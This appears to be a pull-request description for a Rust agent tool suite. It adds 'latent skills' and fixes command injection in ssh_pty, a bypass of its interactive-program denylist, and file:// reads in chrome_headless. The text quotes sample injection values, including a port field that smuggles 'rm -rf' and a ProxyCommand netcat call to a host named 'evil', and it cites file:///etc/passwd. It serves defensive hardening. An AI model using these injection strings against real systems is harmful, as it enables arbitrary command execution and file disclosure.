# 潜在技能 (latent skills) + ssh_pty/chrome_headless 工具安全加固

## 背景

新增「潜在技能」(latent skills) 机制：dep-gated 技能（`ssh-pty`、`chrome-headless`）在用户运行 `install-skills-dep.sh` 安装可选依赖（tmux、chromium）之前不注册为 Tool，避免冷启动时暴露不可用工具。`{$skill-name}` token 同时在 TUI 和 CLI headless 两条路径解析，将技能 body 注入 system prompt。

同时修复了 review 识别的两个 P0 安全漏洞和一个 P1 安全漏洞。

## 变更

### 安全加固

#### P0 — ssh_pty 命令注入（`crates/session/src/tools/ssh_pty.rs`）

`do_connect` 中 `host`/`port`/`key_path` 直接拼入 tmux shell 命令字符串，攻击者可通过 `port="22; rm -rf /tmp/x"` 或 `port="22 -o ProxyCommand=nc evil 4444"` 执行任意命令。

**修复**：新增 `SHELL_DANGEROUS` 字符表 + `validate_port`（数值 u16 范围校验）+ `validate_no_shell_injection`（shell 元字符拒绝），在 `do_connect` 构建命令前调用。

#### P0 — ssh_pty 交互式程序 denylist 绕过（`crates/session/src/tools/ssh_pty.rs`）

`is_interactive_command` 仅检查裸命令名，`env vim`、`exec vim`、`nohup vim` 等通过 wrapper 绕过；`nvim`、`tmux`、`gdb`、`ranger` 等未列入 denylist。

**修复**：
- 新增 `strip_wrappers` 递归剥离 `env`（含 `KEY=value` 跳过）、`exec`、`command`、`nohup`、`nice`、`ionice`、`timeout`（跳过 duration 参数）、`strace`/`ltrace`/`perf`/`valgrind`（跳过 flag），再检查 denylist。
- `ALWAYS_INTERACTIVE` 扩展：nvim/neovim、tmux/screen、gdb/lldb/pdb/ipdb、ranger/mc/tig/lazygit/lazydocker、dialog/whiptail、watch、mutt/neomutt/irssi/weechat 等。

#### P1 — chrome_headless file:// 本地文件读取（`crates/session/src/tools/chrome_headless.rs`）

`normalise_url` 接受任意 `://` scheme，`file:///etc/passwd` 可读取本地文件。

**修复**：`normalise_url` 改为 `Result<String, String>`，拒绝非 `http`/`https` scheme。同时检测裸 `:` scheme（`javascript:`、`data:`），通过 `looks_like_port` 区分 `localhost:3000`（host:port，放行）与 `javascript:alert(1)`（拒绝）。

### extract_skill_tokens 迁移（`crates/core/src/skill.rs`）

`extract_skill_tokens` 从 `tui/src/skill_token.rs` 移至 `core/src/skill.rs`，TUI 和 CLI headless 共享同一实现。原 8 个边界测试随迁移，新位置增加 11 个 `#[test]`（覆盖 lone-dollar、mid-text、adjacent、trimmed-name、double-brace、unclosed、UTF-8、empty-input、empty-name 等）。

### write_install_script 可测试化（`crates/core/src/skill.rs`）

提取 `write_install_script_in(base: &Path) -> io::Result<()>`（纯写入核心），`write_install_script()` 委托给它。新增 2 个 tempdir 测试（creates-file、idempotent）。

### infer_skill_names（`crates/session/src/resume.rs`）

新增私有 `infer_skill_names(body: &Option<String>) -> HashSet<String>`，在 resume 时从持久化的 skill body 推断活跃技能名，恢复 `active_skill_names` 状态。新增 7 个 `#[test]`。

### CLI headless {$skill} token（`crates/cli/src/run.rs`）

`run` 子命令提取 `{$skill-name}` token，解析为技能 body 注入 system prompt（与 TUI 路径一致）。

## 测试覆盖

| 功能 | 测试名 | 文件 |
|------|--------|------|
| port 校验拒绝非数值/越界/注入 | `port_validation_rejects_non_numeric` | `tools/ssh_pty.rs` |
| host/key_path shell 元字符拒绝 | `shell_injection_validation_rejects_metacharacters` | `tools/ssh_pty.rs` |
| env/exec/nohup/timeout/strace wrapper 剥离 | `wrapper_env_stripped_before_denylist` | `tools/ssh_pty.rs` |
| wrapper 剥离后非交互命令仍放行 | `wrapper_still_allows_noninteractive` | `tools/ssh_pty.rs` |
| nvim/tmux/gdb/ranger 等新 denylist 项 | `nvim_and_other_tuis_rejected` | `tools/ssh_pty.rs` |
| 嵌套 wrapper (env exec vim, sudo env vim) | `nested_wrappers_unwrapped` | `tools/ssh_pty.rs` |
| connect 拒绝 host 注入 | `connect_rejects_injection_in_host` | `tools/ssh_pty.rs` |
| connect 拒绝 port 注入 | `connect_rejects_injection_in_port` | `tools/ssh_pty.rs` |
| send 无 session 返回错误 | `send_without_session_returns_error` | `tools/ssh_pty.rs` |
| send 拒绝交互式命令 | `send_rejects_interactive_command` | `tools/ssh_pty.rs` |
| status 无 session 报告 none | `status_without_session_reports_none` | `tools/ssh_pty.rs` |
| 未知 action 返回错误 | `unknown_action_returns_error` | `tools/ssh_pty.rs` |
| file:// scheme 拒绝 | `normalise_url_rejects_file_scheme` | `tools/chrome_headless.rs` |
| ftp/javascript/data scheme 拒绝 | `normalise_url_rejects_other_dangerous_schemes` | `tools/chrome_headless.rs` |
| http/https 放行 | `normalise_url_accepts_http_and_https` | `tools/chrome_headless.rs` |
| host:port 不被误判为 scheme | `normalise_url_host_port_not_rejected` | `tools/chrome_headless.rs` |
| extract_skill_tokens: 空输入 | `extract_tokens_empty_input` | `core/src/skill.rs` |
| extract_skill_tokens: 孤立 $ | `extract_tokens_lone_dollar_is_literal` | `core/src/skill.rs` |
| extract_skill_tokens: 基本剥离 | `extract_tokens_basic_stripped` | `core/src/skill.rs` |
| extract_skill_tokens: 文中保留 | `extract_tokens_mid_text_preserves_surrounding_text` | `core/src/skill.rs` |
| extract_skill_tokens: 多 token有序 | `extract_tokens_multiple_in_order` | `core/src/skill.rs` |
| extract_skill_tokens: 相邻 token | `extract_tokens_adjacent` | `core/src/skill.rs` |
| extract_skill_tokens: 空白修剪 | `extract_tokens_name_with_spaces_trimmed` | `core/src/skill.rs` |
| extract_skill_tokens: 空名跳过 | `extract_tokens_empty_name_skipped` | `core/src/skill.rs` |
| extract_skill_tokens: 未闭合字面 | `extract_tokens_unclosed_is_literal` | `core/src/skill.rs` |
| extract_skill_tokens: 双花括号 | `extract_tokens_double_brace_not_a_token` | `core/src/skill.rs` |
| extract_skill_tokens: UTF-8 | `extract_tokens_utf8_text_preserved` | `core/src/skill.rs` |
| write_install_script: 创建文件 | `write_install_script_creates_file` | `core/src/skill.rs` |
| write_install_script: 幂等 | `write_install_script_idempotent` | `core/src/skill.rs` |
| infer_skill_names: None body | `infer_skill_names_none_body` | `resume.rs` |
| infer_skill_names: 空 body | `infer_skill_names_empty_body` | `resume.rs` |
| infer_skill_names: 检测 ssh_pty | `infer_skill_names_detects_ssh_pty` | `resume.rs` |
| infer_skill_names: 检测 ssh-pty | `infer_skill_names_detects_ssh_pty_dash` | `resume.rs` |
| infer_skill_names: 检测 chrome_headless | `infer_skill_names_detects_chrome_headless` | `resume.rs` |
| infer_skill_names: 检测两者 | `infer_skill_names_detects_both` | `resume.rs` |
| infer_skill_names: 200 字符边界 | `infer_skill_names_ignores_after_200_chars` | `resume.rs` |

- 全量回归：`cargo test --workspace` → 826 passed / 0 failed
- clippy：`cargo clippy --workspace --all-targets -- -D warnings` → 0 警告
- build：`cargo build --workspace` → Finished

## Gate

| 项 | 值 |
|----|-----|
| 新增测试 | 36 |
| 基线 → 当次 | 790 passed → 826 passed (+36) |
| clippy | 0 警告 |
| cargo fmt --check | 通过 |
| ssh_pty.rs 行数 | 743 行（迭代中，≤800） |
| chrome_headless.rs 行数 | 278 行（≤400） |

## Impact Surface

- **安全**：ssh_pty 命令注入已封堵（port 数值校验 + host/key_path 元字符拒绝）；交互式 denylist 不再可绕过（wrapper 剥离 + 扩展列表）；chrome_headless 不再接受 file:///javascript:/data: scheme。
- **向后兼容**：合法 host（`user@1.2.3.4`）、port（`22`）、key_path（`~/.ssh/id_rsa`）不受影响。`localhost:3000` 等 host:port URL 不受影响。
- **不受影响**：session runner、store 数据形状、web 路由、TUI 交互逻辑。`extract_skill_tokens` 行为不变（仅迁移位置）。
